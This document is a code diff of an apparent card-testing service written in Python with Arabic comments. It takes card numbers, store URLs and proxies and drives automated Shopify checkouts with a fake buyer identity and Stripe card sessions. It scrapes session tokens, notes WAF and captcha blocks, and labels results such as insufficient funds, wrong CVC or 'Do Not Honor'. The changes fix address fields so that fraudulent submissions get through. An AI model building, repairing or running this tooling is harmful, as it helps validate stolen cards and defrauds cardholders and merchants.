@@ -9,7 +9,6 @@ import urllib3
 from html import unescape
 from urllib.parse import urlparse
 
-# إخفاء تحذيرات SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = FastAPI()
@@ -23,9 +22,8 @@ def format_proxy(proxy_str):
     return f"http://{proxy_str}"
 
 def safe_response(msg, raw_data, price, gate="Python X-Ray"):
-    # نفس دالة الطباعة الخام لضمان الشفافية
-    raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '')[:60] if raw_data else "No Raw Data"
-    final_msg = f"{msg} | RAW: {raw_clean}"
+    raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:70] if raw_data else "No Raw Data"
+    final_msg = f"{msg} | RAW: {raw_clean}" if "Failed" in msg or "Error" in msg or "Declined" in msg else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
     return {"Response": final_msg, "Price": clean_price, "Gate": gate}
 
@@ -49,7 +47,6 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "2125551234"
         }
 
-        # استخدام نفس المكتبة المستقرة requests==2.31.0
         with requests.Session() as session:
             session.verify = False
             if proxies: session.proxies.update(proxies)
@@ -98,9 +95,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             html_chk = res_chk.text
             final_url = str(res_chk.url)
 
-            if res_chk.status_code in [403, 429]:
-                return JSONResponse(content=safe_response("WAF Blocked Checkout", html_chk[:80], price))
-            
+            if res_chk.status_code in [403, 429]: return JSONResponse(content=safe_response("WAF Blocked Checkout", html_chk[:80], price))
             if 'hcaptcha' in html_chk.lower() or 'g-recaptcha' in html_chk.lower() or 'challenge-platform' in html_chk.lower():
                 return JSONResponse(content=safe_response("Store Demands Captcha", html_chk[:80], price))
 
@@ -113,10 +108,8 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             meta_st = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
             js_st = re.search(r'["\']?sessionToken["\']?\s*:\s*["\']([^"\']{20,})["\']', html_chk, re.IGNORECASE)
             
-            if meta_st:
-                is_graphql = True; session_token = unescape(meta_st.group(1))
-            elif js_st:
-                is_graphql = True; session_token = unescape(js_st.group(1))
+            if meta_st: is_graphql = True; session_token = unescape(meta_st.group(1))
+            elif js_st: is_graphql = True; session_token = unescape(js_st.group(1))
             else:
                 jwt_match = re.search(r'(eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})', html_chk)
                 if jwt_match: is_graphql = True; session_token = jwt_match.group(1)
@@ -138,6 +131,31 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
             card_session_id = res_pci.json().get("id")
 
+            # =========================================================
+            # التعديل الجراحي لحل خطأ (DeliveryTermsInput invalid value)
+            # =========================================================
+            
+            # 1. عنوان حساب الشحن (جغرافي فقط بدون أسماء لتجنب رفض GraphQL)
+            geo_address = {
+                "address1": buyer["address1"],
+                "city": buyer["city"],
+                "countryCode": buyer["country"],
+                "postalCode": buyer["zip"],
+                "zoneCode": buyer["province"]
+            }
+            
+            # 2. عنوان الفاتورة والدفع (يحتوي على الاسم ورقم الهاتف)
+            full_address = {
+                "address1": buyer["address1"],
+                "city": buyer["city"],
+                "countryCode": buyer["country"],
+                "firstName": buyer["first_name"],
+                "lastName": buyer["last_name"],
+                "phone": buyer["phone"],
+                "postalCode": buyer["zip"],
+                "zoneCode": buyer["province"]
+            }
+
             gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
             gql_headers = {
                 'shopify-checkout-client': 'checkout-web/1.0', 'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
@@ -145,20 +163,40 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             }
             merch_id = str(uuid.uuid4())
             
-            # --- هذا هو التعديل الوحيد المطابق للمشكلة ---
-            addr_data = {
-                "address1": buyer["address1"], 
-                "city": buyer["city"], 
-                "countryCode": buyer["country"], 
-                "firstName": buyer["first_name"], 
-                "lastName": buyer["last_name"], 
-                "zoneCode": buyer["province"], 
-                "postalCode": buyer["zip"], 
-                "phone": buyer["phone"]
-            }
-            
             prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
-            prop_vars = {"delivery": {"deliveryLines": [{"destination": addr_data, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": addr_data}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]}, "sessionInput": {"sessionToken": session_token}}
+            prop_vars = {
+                "delivery": {
+                    "deliveryLines": [{
+                        "destination": {"partialStreetAddress": geo_address}, # تم إرسال الجغرافي فقط هنا
+                        "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
+                        "deliveryMethodTypes": ["SHIPPING"],
+                        "destinationChanged": True,
+                        "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}},
+                        "expectedTotalPrice": {"any": True}
+                    }],
+                    "supportsSplitShipping": True
+                },
+                "payment": {
+                    "totalAmount": {"any": True},
+                    "paymentLines": [],
+                    "billingAddress": {"streetAddress": full_address}
+                },
+                "merchandise": {
+                    "merchandiseLines": [{
+                        "stableId": merch_id,
+                        "merchandise": {
+                            "productVariantReference": {
+                                "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
+                                "variantId": f"gid://shopify/ProductVariant/{variant_id}"
+                            }
+                        },
+                        "quantity": {"items": {"value": 1}},
+                        "expectedTotalPrice": {"any": True}
+                    }]
+                },
+                "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]},
+                "sessionInput": {"sessionToken": session_token}
+            }
             
             res_prop = session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
             queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
@@ -169,7 +207,40 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
 
             sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
             sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
-            sub_vars = {"attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}", "input": {"sessionInput": {"sessionToken": session_token}, "queueToken": queue_token, "delivery": {"deliveryLines": [{"destination": addr_data, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319", "sessionId": card_session_id, "billingAddress": addr_data}}, "amount": {"any": True}}], "billingAddress": addr_data}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}}}
+            sub_vars = {
+                "attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}",
+                "input": {
+                    "sessionInput": {"sessionToken": session_token},
+                    "queueToken": queue_token,
+                    "delivery": {
+                        "deliveryLines": [{
+                            "destination": {"streetAddress": full_address}, # في التأكيد النهائي يتم إرسال العنوان كاملاً
+                            "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
+                            "deliveryMethodTypes": ["SHIPPING"],
+                            "destinationChanged": False,
+                            "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}},
+                            "expectedTotalPrice": {"any": True}
+                        }],
+                        "supportsSplitShipping": True
+                    },
+                    "merchandise": prop_vars["merchandise"],
+                    "payment": {
+                        "totalAmount": {"any": True},
+                        "paymentLines": [{
+                            "paymentMethod": {
+                                "directPaymentMethod": {
+                                    "paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319",
+                                    "sessionId": card_session_id,
+                                    "billingAddress": {"streetAddress": full_address}
+                                }
+                            },
+                            "amount": {"any": True}
+                        }],
+                        "billingAddress": {"streetAddress": full_address}
+                    },
+                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}
+                }
+            }
             
             res_sub = session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers)
             sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
@@ -177,7 +248,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if sub_data.get('__typename') == 'SubmitRejected':
                 errs = sub_data.get('errors', [])
                 msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'Rejected'
-                return JSONResponse(content=safe_response("Shopify Declined", f"Error: {msg}", price))
+                return JSONResponse(content=safe_response("Shopify System Rejected", msg, price))
             
             receipt_id = sub_data.get('receipt', {}).get('id')
             if not receipt_id: 
@@ -196,6 +267,8 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                         err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
                         if "INSUFFICIENT" in err: return JSONResponse(content=safe_response("Insufficient Funds", err, price))
                         elif "CVC" in err: return JSONResponse(content=safe_response("Incorrect CVC", err, price))
+                        elif "ZIP" in err or "ADDRESS" in err: return JSONResponse(content=safe_response("ZIP Code Mismatch", err, price))
+                        elif "DO_NOT_HONOR" in err: return JSONResponse(content=safe_response("Do Not Honor", err, price))
                         return JSONResponse(content=safe_response(f"Declined: {err}", err, price))
                 time.sleep(1.5)
                 
